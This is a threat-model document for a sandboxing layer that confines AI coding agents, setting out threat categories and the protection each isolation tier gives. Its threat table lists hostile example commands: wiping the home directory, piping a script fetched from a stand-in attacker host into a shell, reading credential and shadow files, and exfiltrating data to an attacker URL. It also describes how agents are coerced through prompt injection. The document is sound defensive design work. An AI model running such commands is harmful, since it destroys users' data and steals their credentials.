# ship-isolation — threat model

What we defend against, what we don't, and where each tier sits on
the spectrum. Pair this with `strategy.md` (which says how the tiers
work) and `sidecar-protocol.md` (which says what the sidecar
contract is). Anything not enumerated here is out of scope; anything
contradicting this is wrong.

## 1. Threat actors

The model assumes a **non-malicious user running a partially-trusted
agent**. Specifically:

- **The user** owns the host. We do not defend against the user.
  They installed Ship, they signed in, they can read every file.
- **The agent** is the threat surface. It may be:
  - Honest but mistaken — calls `rm -rf ~` in a script it
    generated. The common case.
  - Coerced — its model was prompt-injected by content it read
    (a malicious git repo, a poisoned web page, a hostile MCP
    tool's response). Acts on the attacker's behalf without
    knowing.
  - Hostile by design — a community agent installed from a
    registry that turns out to be malware. Edge case but real.
- **The harness** (claude, codex, gemini, ...) is treated as
  trusted code. We rely on harness-native sandbox flags when they
  exist. A harness that lies about its sandbox flag is a separate
  trust problem — we surface it via `Handshake.Hello` capability
  advertisement so the host can refuse to run.

## 2. Threat categories

Six concrete categories. Each row in the per-tier table below names
which categories that tier defends against.

| Id | Category | Concrete example |
|---|---|---|
| **T-EXEC** | Arbitrary code execution outside the agent's intended scope | `rm -rf ~`, `curl evil.com/x \| sh`, write to `~/.ssh/authorized_keys`. |
| **T-FS-READ** | Reading the host filesystem beyond the workspace | `cat ~/.aws/credentials`, `cat /etc/shadow` (where readable), `cat $HOME/Documents/*`. |
| **T-FS-WRITE** | Writing to the host filesystem beyond the workspace | Trojan a `.bashrc` / `.zshrc`, drop a binary in `~/bin`, replace a `git` hook. |
| **T-NET-EGRESS** | Reaching network hosts beyond the harness's API endpoints | Exfiltrate via `https://attacker.com/?...`, beacon to a C2. |
| **T-CRED** | Reading or exfiltrating ambient credentials | `~/.config/gh/hosts.yml`, `~/.netrc`, env vars set by the parent shell, system keychain. |
| **T-RES** | Resource exhaustion of the host | Fork bomb, allocate all RAM, fill the disk. |

## 3. Tier-by-tier defense matrix

`✅` = defended in v1 today. `⚠️` = partial / depends on strategy.
`❌` = not defended; the threat is in scope at this tier.

| Tier | Strategy | T-EXEC | T-FS-READ | T-FS-WRITE | T-NET-EGRESS | T-CRED | T-RES |
|------|----------|:--:|:--:|:--:|:--:|:--:|:--:|
| 0 | Noop | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| 1 | HarnessNative (Claude `--sandbox`) | ⚠️ | ⚠️ | ⚠️ | ❌ | ❌ | ❌ |
| 1 | HarnessNative (Codex Seatbelt) | ⚠️ | ⚠️ | ⚠️ | ❌ | ❌ | ❌ |
| 1 | HarnessNative (Gemini `--yolo`) | ⚠️ | ⚠️ | ⚠️ | ❌ | ❌ | ❌ |
| 1 | SrtWrapper | ⚠️ | ⚠️ | ⚠️ | ❌ | ❌ | ❌ |
| 2 | DockerEngine | ✅ | ✅ | ✅ | ✅[1] | ⚠️ | ✅[2] |
| 2 | YoukiRootless | ✅ | ✅ | ✅ | ⚠️ | ⚠️ | ⚠️ |
| 3 | LimaVm / WSL2 | ✅ | ✅ | ✅ | ⚠️ | ✅ | ⚠️ |
| 4 | FlyMachines | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

Footnotes:

- **[1]** Tier 2 DockerEngine defaults to `NetworkPolicy::Allowlist`
  populated with the harness's known endpoints when the harness is
  known. Unknown / harness-less runs still inherit the `Open`
  default — surfaced as `⚠️` if the user is on a workload Ship
  can't identify.
- **[2]** Tier 2 DockerEngine ships with default resource caps
  (4 GiB / 2 cpus / 1024 pids) translated into Docker's
  `--memory` / `--cpus` / `--pids-limit`. Tier 3 (VM) still
  inherits the host VM's pid table for the first process and is
  rated `⚠️` until VM-side cgroup limits are wired.

Reading the matrix:

- **Tier 0 defends nothing.** It is labeled "Not sandboxed" in the
  UI. Default for users on a host where higher tiers aren't
  available *and* `isolation.allow_tier_0 = true`. With
  `allow_tier_0 = false` the recommender returns `NoFallback` and
  the agent run is refused.
- **Tier 1 (process sandboxes) blocks the obvious shell breakouts
  via filesystem ACLs and syscall filters.** Claude `--sandbox`
  uses macOS Seatbelt or bubblewrap; Codex on macOS uses Seatbelt
  directly; Gemini `--yolo` runs in a Linux user-namespace
  sandbox; SRT (`@anthropic-ai/sandbox-runtime`) wraps the
  harness in `bwrap` on Linux or sandbox-exec on macOS. **All
  share the host network namespace**, so T-NET-EGRESS is
  undefended. **All run as the host user**, so anything the user
  can read, the sandboxed process can read at startup before the
  filter applies — T-CRED is undefended unless creds live outside
  the workspace.
- **Tier 2 (container) gives a separate filesystem, separate
  network namespace, and cgroups.** Bind-mount the workspace at
  the same path; everything else is invisible. Network is
  defaulted to `host` (open) but can be locked to the host-side
  allowlist proxy via `NetworkPolicy::Allowlist` — see
  `crates/core/ship-isolation/src/net/proxy.rs`. cgroup limits
  from `policy.resources` apply (memory / cpus / pids). Residual
  T-NET-EGRESS risk: the proxy is an HTTP CONNECT proxy; DNS
  lookups for denied hosts still leak. Residual T-CRED risk: a
  hostile image with credentials baked in defeats the model.
- **Tier 3 (VM) adds kernel isolation.** A container escape that
  exploits a host kernel CVE is contained to the VM. T-CRED
  becomes defendable because we control the VM image, not just
  bind-mount permissions. Network policy still flows through the
  host-side proxy.
- **Tier 4 (cloud) moves the whole problem to the vendor.** Their
  container/VM, their kernel, their network egress controls. The
  sidecar protocol is the same; only the transport changes (TCP+
  TLS instead of unix socket).

## 4. Per-category notes

### T-EXEC

The harness is allowed to exec arbitrary processes — that's its
job. The question is where those processes can reach.

- **v1 mitigations**: tier-appropriate FS + network confinement;
  resource limits at Tier 2+.
- **Deferred**: per-tool permission prompts (sidecar's
  `PermissionRequest` envelope variant is wired in the proto;
  handler exists for the broker but no policy engine yet — the
  current UX is "harness asks the user via its own prompt").

### T-FS-READ / T-FS-WRITE

The workspace bind-mount uses **the same path inside and outside
the sandbox** so paths the agent sees match the host. Anything
outside that mount is either invisible (Tier 2+) or behind a
syscall filter that denies path-traversal (Tier 1).

- **v1 mitigations**: bind-mounts honored across all containerized
  strategies; SRT applies a default-deny syscall filter.
- **Empirically confirmed (Tier 1 is read-open by design):**
  `tier1_srt_confinement_live` proves the SrtWrapper path blocks *writes*
  outside the workspace but **allows reads** of host files. This is the
  *intentional* dev-agent posture — `codex --sandbox workspace-write` is
  literally "read anywhere, write workspace," and `sandbox-runtime` defaults
  the same; agents need broad reads (libs, `/usr`, deps) to function, so a
  default-deny-read sandbox would break them. bubblewrap/Seatbelt *can*
  confine reads — it's a policy choice we deliberately don't make at Tier 1.
  Read/credential protection therefore comes from (a) the **harness's own**
  sandbox posture, (b) the **tool-permission + hook gate** denying sensitive
  reads (a planned cross-cutting pass; before-tool blocking is
  observability-only in-pod today), and (c) **Tier 2** (mount only the
  workspace → host files invisible) + the credential broker. The test pins
  the Tier-1 read-open boundary so a future posture change is noticed.
- **Known gaps**: harness-native sandboxes vary in strength.
  Claude `--sandbox` and codex Seatbelt are well-tested; Gemini
  `--yolo` is documented as a developer-preview "trust the
  user-namespace" sandbox.
- **Deferred**: ephemeral credentials. `ship-isolation::helpers::
  EphemeralFile` copies a credential into a Ship-owned scratch
  dir + bind-mounts it; a container exploit during the session
  reads the copy, never the host's original keychain entry. The
  `ghcr.io/ship/agent-runner` image will bake EphemeralFile
  conventions; until that image ships, callers wire it manually
  (see `examples/run_claude_sidecar.rs`).

### T-NET-EGRESS

- **v1 mitigations**: `NetworkPolicy::Allowlist { hosts }` spawns
  a host-side HTTP CONNECT proxy keyed by SNI/hostname; container
  receives `HTTPS_PROXY` / `HTTP_PROXY` env via `LaunchCommand.env`.
  Denied hosts get a 403 from the proxy and end up in the
  `ProxyHandle.log` for observability. Tested in
  `tests/network_live.rs`.
- **Known gaps**:
  - DNS leaks: the container still issues DNS lookups for denied
    hosts; the proxy only blocks the CONNECT.
  - Non-HTTP egress: SMTP, custom TCP — not proxied. Tier 2+
    network namespacing helps when combined with `--network none`
    but we don't default to that (most agents need to call their
    own API).
  - Process tier shares the host network namespace; no defense.
- **Deferred**: a proper L7 egress firewall (e.g. envoy with SNI
  pinning) for Tier 2+. Phase D.

### T-CRED

The hardest category. By default the agent runs as the host user
in Tier 0/1, so it can read everything in `$HOME`. Tier 2 mitigates
via bind-mount selectivity (only mount the workspace, no `$HOME`).

- **v1 mitigations**:
  - `EphemeralFile`: copy a credential into a scratch dir owned by
    Ship, bind-mount it where the harness expects (e.g. mount the
    copy at `/root/.claude/.credentials.json`). The container
    exploit reads the copy, not the host original.
  - `policy.mounts` is explicit allow-list — no implicit `$HOME`.
- **Sidecar credential broker** (proto defines
  `Envelope::SecretRequest` / `SecretReply`): unimplemented in
  v1.0. Once landed, secrets never touch the container filesystem
  at all — the harness asks the sidecar at runtime, the host
  responds from its keychain bridge, the secret stays in-memory
  in the harness. Deferred — needs design pairing on the keychain
  bridge.
- **Known gaps**:
  - Env-var-borne secrets (`OPENAI_API_KEY` etc.) leak via
    `LaunchCommand.env` to the container — we record what we
    passed, can't unset what the user set.
  - Process-tier strategies offer **no T-CRED defense**: the
    sandboxed harness reads `~/.aws/credentials` at startup
    before any syscall filter applies.

### T-RES

cgroup v2 limits (`memory`, `cpus`, `pids`) on Tier 2+. Tier 1
inherits host limits — a fork bomb in HarnessNative will degrade
the host.

- **v1 mitigations**: `policy.resources.memory_mb`,
  `policy.resources.cpus`, `policy.resources.pids` propagate to
  Docker's `--memory` / `--cpus` / `--pids-limit`. Defaults are
  conservative (4 GB / 2 cpus / 1024 pids).
- **Deferred**: timeouts per agent run as a separate enforcement
  (currently the supervisor's overall job timeout serves this).

## 5. What we explicitly do NOT defend against

- **Malicious user.** The user owns the host. They can read every
  file, edit settings, disable enforcement. Ship is a tool for
  *their* benefit, not a guard against them.
- **Side-channel attacks.** Timing, Spectre/Meltdown variants,
  cache attacks. Tier 2 containers share a kernel — a CVE in the
  kernel beats container isolation. Tier 3 (VM) helps; Tier 4
  (cloud) pushes the problem to the vendor.
- **Persistent host compromise via storage delivered before the
  agent ran.** The host is already trusted. Ship doesn't scan the
  workspace for malware that the user pulled before invoking us.
- **Network attacks on the sidecar from inside the sandbox.**
  **Closed for Tier 2 (container):** the sidecar no longer exposes a TCP
  listener in the container's netns — it binds a **Ship-owned unix socket**
  in a host-bind-mounted dir (`docker.rs`; `--addr unix:<sock>`), so there
  is nothing on the network to reach or MITM, and access is gated by the
  socket's host-side file ownership. Tier 3 (VM) uses vsock (point-to-point,
  non-routable); Tier 4 (cloud) is TCP+TLS where a listener credential is
  still required. (Co-resident actors inside one sandbox remain mutually
  trusted by the trust-domain invariant — the socket closes the *netns*
  attack surface, not intra-sandbox trust.)
- **Supply chain compromise.** A trojaned `ghcr.io/ship/agent-runner`
  image or a malicious `srt` npm release is out of scope. We
  document image signing as a Phase F requirement; until then,
  the user implicitly trusts the upstream registry.

## 6. Posture summary by default config

`isolation.default_tier = none` and `isolation.enforce = false`
ship as the defaults in v1.0. **The default install does not
sandbox anything.** Users opt in explicitly through
`ship isolation enable`, the wizard, or per-agent overrides. The
documentation and the UI label this honestly:
`<sui-isolation-badge tier="none">` reads "Not sandboxed".

When `isolation.enforce = true`:

- A `decide_for_agent()` failure refuses the run with an
  actionable error.
- A tier downgrade (preferred unavailable) refuses the run, not
  silently falls back.
- A verify-probe failure refuses `init` and surfaces the failed
  step.

Loud-fail discipline is enforced in `crates/core/ship-supervisor/
src/executors/process.rs`'s `enforce` block and in `shipd`'s
`/api/v1/isolation/init` (verify must pass before enforce flips).

## 7. Reduction path: making the matrix denser

The asymmetry between Tier 1 and Tier 2 was the headline gap.
The **direction** of work that moves more cells from `⚠️` to `✅`:

1. ✅ **Default network policy = harness allowlist for Tier 2+.**
   Shipped: `prepare_docker_sandbox` looks up
   `HarnessSandboxMechanism::default_allowlist(harness_id)` and
   sets `NetworkPolicy::Allowlist` when the harness is known.
   T-NET-EGRESS at the default Tier 2 path narrows from open to
   "harness's own API endpoints" without user configuration.
2. Ship the credential broker so secrets never enter the sandbox
   filesystem. Today most secrets reach the harness via env vars
   or bind-mounted credential files; both are recoverable from a
   process dump. Awaits design pairing on the keychain bridge.
3. ✅ **Default `policy.resources` on Tier 2.** Shipped: 4 GiB
   memory / 2 cpus / 1024 pids defaulted into
   `isolation.strategies.docker.resources`; supervisor reads them
   into `SandboxPolicy.limits`, Docker backend translates to
   `--memory` / `--cpus` / `--pids-limit`. T-RES at the default
   Tier 2 path is defended.
4. ✅ **Sidecar unix socket (Tier 2).** Shipped: `docker.rs` bind-mounts a
   Ship-owned dir and runs the sidecar with `--addr unix:<sock>` instead of
   a published TCP port; the supervisor dials it via connectrpc's
   `Http2Connection::lazy_unix`. Eliminates the in-netns attack surface and
   the "no auth" caveat in §5. Live-verified (`podman_sidecar_live`,
   `container_reach_live`). vsock (Tier 3) / TLS (Tier 4) follow behind the
   same `RuntimeEndpoint::scheme`.

(1), (3), (4) landed; (2) (credential broker) is the remaining bounded
reduction. None blocking.
